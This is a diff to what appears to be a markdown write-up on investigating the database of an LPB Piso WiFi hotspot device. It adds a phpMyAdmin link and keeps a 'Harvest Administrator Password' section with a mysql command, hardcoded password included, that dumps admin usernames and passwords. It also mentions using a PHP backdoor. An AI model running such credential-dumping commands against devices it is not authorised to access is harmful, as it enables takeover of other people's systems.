@@ -8,9 +8,13 @@ This is the most interesting part in investigating the LPB Piso WiFi database. T
 
 - or, we can execute a php backdoor to connect to MySQL without database password.
 
-> These information only applies to users who got SSH access to LPB.
+# phpMyAdmin
+LPB Piso WiFi has a phpMyAdmin installed. You can login using the provided username and password [here](http://10.0.0.1/phpMyAdmin-4.9.11-english).
 
 # Harvest Administrator Password (From 10.0.0.1/admin)
+
+> These information only applies to users who got SSH access to LPB.
+
 To harvest admin password, execute:
 ```
 mysql -u lpbpisowifi -pNkncqvS6vTkF1BTs -D rpi_wifi -e "SELECT username, password FROM my_users"
